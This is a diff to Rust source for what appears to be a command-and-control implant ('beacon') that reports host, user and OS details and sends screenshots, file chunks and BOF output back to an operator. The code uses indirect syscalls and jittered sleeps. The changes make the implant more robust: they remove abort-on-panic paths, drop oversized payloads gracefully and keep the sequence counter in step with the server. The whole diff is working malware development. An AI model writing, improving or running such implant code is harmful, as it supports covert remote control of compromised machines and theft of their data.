@@ -130,8 +130,14 @@ pub unsafe fn beacon_loop() {
         auth_token: implant.auth_token, // per-implant one-time token (None for legacy)
     };
     let mut info_writer = Writer::new();
-    info.encode(&mut info_writer)
-        .expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
+    // P0-4: a panic here would abort the beacon. SessionInfo fields are tightly
+    // bounded (hostname/user/os host strings + a 32-byte auth_token), so this
+    // branch is effectively unreachable — but under panic=abort we must not
+    // let a malformed Writer state kill the process. Bail out cleanly instead.
+    if info.encode(&mut info_writer).is_err() {
+        crate::entry::diag_mark(b"ERR_SESSIONINFO_ENCODE");
+        return;
+    }
     let info_plain = info_writer.into_bytes();
 
     // Borrow the indirect-syscall runtime (initialized by entry). File ops fall
@@ -216,12 +222,10 @@ pub unsafe fn beacon_loop() {
             }
         }
 
-        let frame = encode_frame(
-            &pubkey,
-            counter,
-            &key,
-            &TaskResponse::encode_vec(&pending).expect("beacon batch encodes within MAX_BLOB_LEN"),
-        );
+        // P0-4: encode_batch replaces any oversized Response with an Err so the
+        // frame always encodes instead of aborting the beacon when a screenshot
+        // BMP or BOF output exceeds MAX_BLOB_LEN.
+        let frame = encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending));
         counter += 1;
         pending.clear();
 
@@ -264,22 +268,26 @@ pub unsafe fn beacon_loop() {
                 // If the accumulated batch would exceed the frame cap, flush it
                 // now (a streamed Download/Screenshot can produce a lot).
                 if pending_batch_size(&pending) > BATCH_FLUSH {
-                    let frame = encode_frame(
-                        &pubkey,
-                        counter,
-                        &key,
-                        &TaskResponse::encode_vec(&pending)
-                            .expect("flush batch encodes within MAX_BLOB_LEN"),
-                    );
-                    let _ = unsafe {
+                    // P0-4: encode_vec can fail if a single Response blob
+                    // (screenshot BMP / BOF output) exceeds MAX_BLOB_LEN —
+                    // encode_batch swaps oversized responses for Err so the
+                    // batch always encodes instead of aborting the beacon.
+                    let frame = encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending));
+                    let sent = unsafe {
                         crate::channels::dispatch_send_recv(
                             &ch_ctx,
                             crate::channels::get_active(),
                             &frame,
                         )
                     };
-                    counter += 1;
-                    pending.clear();
+                    // P0-3: only advance the counter and clear the batch when
+                    // the send actually succeeded. On failure, keep `pending`
+                    // so it is retried next cycle; otherwise the responses are
+                    // silently dropped AND the counter desyncs from the server.
+                    if sent.is_some() {
+                        counter += 1;
+                        pending.clear();
+                    }
                 }
             }
         }
@@ -346,8 +354,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
         auth_token: implant.auth_token,
     };
     let mut info_writer = Writer::new();
-    info.encode(&mut info_writer)
-        .expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
+    // P0-4: bail out with a failure exit code instead of panicking. See the
+    // matching note in beacon_loop — SessionInfo is bounded, so this branch is
+    // effectively unreachable, but panic=abort makes a bare expect fatal.
+    if info.encode(&mut info_writer).is_err() {
+        crate::entry::diag_mark(b"ERR_ONESHOT_SESSIONINFO");
+        return 0xC2; // SessionInfo encode failed (malformed Writer state)
+    }
     let info_plain = info_writer.into_bytes();
     let rt = crate::syscalls::global();
     crate::entry::diag_mark(b"b5_info");
@@ -385,12 +398,14 @@ pub unsafe fn beacon_oneshot() -> u32 {
         crate::entry::diag_mark(b"b7a_before_sleep");
         sleep_jitter(2, 0);
         crate::entry::diag_mark(b"b7b_after_sleep");
-        // POST empty batch, receive any queued tasks.
+        // POST empty batch, receive any queued tasks. An empty batch has no
+        // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
+        // so a malformed Writer state never aborts the beacon (P0-4).
         let frame = encode_frame(
             &pubkey,
             counter,
             &key,
-            &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
+            &TaskResponse::encode_vec(&[]).unwrap_or_default(),
         );
         counter += 1;
         crate::entry::diag_mark(b"b8_poll");
@@ -432,21 +447,21 @@ pub unsafe fn beacon_oneshot() -> u32 {
             }
         }
         if !pending.is_empty() {
-            let rframe = encode_frame(
-                &pubkey,
-                counter,
-                &key,
-                &TaskResponse::encode_vec(&pending)
-                    .expect("oneshot tail batch encodes within MAX_BLOB_LEN"),
-            );
-            counter += 1;
-            let _ = unsafe {
+            // P0-4: encode_batch swaps any oversized Response for an Err so the
+            // frame always encodes instead of aborting the beacon.
+            let rframe = encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending));
+            let sent = unsafe {
                 crate::channels::dispatch_send_recv(
                     &ch_ctx,
                     crate::channels::get_active(),
                     &rframe,
                 )
             };
+            // P0-3: only advance the counter when the send actually succeeded,
+            // so a failed round-trip doesn't desync the sequence number.
+            if sent.is_some() {
+                counter += 1;
+            }
         }
         break;
     }
@@ -456,6 +471,39 @@ pub unsafe fn beacon_oneshot() -> u32 {
         1
     }
 }
+/// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
+/// oversized payload. `TaskResponse::encode_vec` only fails when a blob
+/// exceeds `wire::MAX_BLOB_LEN` (256 KiB) — in practice a screenshot BMP or
+/// large BOF output. Since `panic = "abort"`, letting that propagate kills the
+/// beacon; instead we replace each oversized [`Response`] with a tiny
+/// `Response::Err` and retry. The operator sees what was dropped instead of
+/// the implant dying. `Response::Err` messages are themselves bounded well
+/// under `MAX_BLOB_LEN`, so the retry always succeeds.
+fn encode_batch(pending: &mut Vec<TaskResponse>) -> Vec<u8> {
+    if let Ok(v) = TaskResponse::encode_vec(pending) {
+        return v;
+    }
+    // One or more responses carried a blob > MAX_BLOB_LEN. Replace each
+    // oversized payload with an Err so the batch encodes (and the operator is
+    // told what was dropped rather than the beacon aborting).
+    for tr in pending.iter_mut() {
+        let too_big = match &tr.response {
+            Response::FileChunk { data, .. }
+            | Response::Output(data)
+            | Response::BofOutput(data)
+            | Response::Image(data)
+            | Response::Channel { data, .. } => data.len() > nyx_protocol::wire::MAX_BLOB_LEN,
+            Response::Ok | Response::Err(_) => false,
+        };
+        if too_big {
+            tr.response = Response::Err(String::from(
+                "response too large: payload exceeds MAX_BLOB_LEN",
+            ));
+        }
+    }
+    TaskResponse::encode_vec(pending).unwrap_or_default()
+}
+
 /// Only FileChunk/Output/BofOutput/Image carry significant volume; acks and
 /// errors are negligible. Mirrors agent-dev's heuristic.
 fn pending_batch_size(pending: &[TaskResponse]) -> usize {
